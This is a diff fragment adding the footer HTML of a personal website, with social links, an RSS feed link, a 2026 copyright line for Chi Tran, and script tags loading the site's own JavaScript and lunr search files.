+          <li><a href="https://github.com/0xfatty" rel="nofollow noopener noreferrer"><i class="fab fa-fw fa-github" aria-hidden="true"></i> GitHub</a></li>
+        
+      
+        
+          <li><a href="https://www.linkedin.com/in/iam-trchi/" rel="nofollow noopener noreferrer"><i class="fab fa-fw fa-linkedin" aria-hidden="true"></i> LinkedIn</a></li>
+        
+      
+    
+
+    
+      <li><a href="/feed.xml"><i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> Feed</a></li>
+    
+  </ul>
+</div>
+
+<div class="page__footer-copyright">&copy; 2026 Chi Tran</div>
+
+
+      </footer>
+    </div>
+
+    
+
+  <script src="/assets/js/main.min.js"></script>
+
+
+
+
+
+<script src="/assets/js/lunr/lunr.min.js"></script>
+<script src="/assets/js/lunr/lunr-store.js"></script>
+<script src="/assets/js/lunr/lunr-en.js"></script>
+
+
+
+
+
+
+
+
+  </body>
+</html>
